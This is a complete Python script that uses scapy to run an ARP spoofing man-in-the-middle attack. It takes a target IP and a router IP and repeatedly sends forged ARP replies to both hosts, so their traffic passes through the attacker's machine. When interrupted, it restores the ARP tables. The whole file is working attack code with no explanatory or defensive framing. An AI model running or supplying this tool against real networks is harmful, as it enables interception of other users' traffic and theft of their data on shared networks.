import time
import scapy.all as scapy
import optparse


def get_ip():
    parse = optparse.OptionParser()
    parse.add_option("-t", "--target-ip", dest="target_ip", help="Target ip")
    parse.add_option("-r", "--router-ip", dest="router_ip", help="Router ip")
    res = parse.parse_args()[0]
    return res


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_pack = scapy.ARP(op=2,  pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_pack, verbose=False)


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    pack = broadcast_req/arp_req
    answered_list = scapy.srp(pack, timeout=1, verbose=False)[0]
    return answered_list[0][1].src


def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp, verbose=False)


response = get_ip()
packet_no = 0
try:
    while True:
        spoof(response.target_ip, response.router_ip)
        spoof(response.router_ip, response.target_ip)
        packet_no += 2
        print("\r[+] sent " + str(packet_no) + " packets", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Total " + str(packet_no) + "sent")
    print("ARP table restoring...")
    restore(response.router_ip, response.target_ip)
    restore(response.target_ip, response.router_ip)
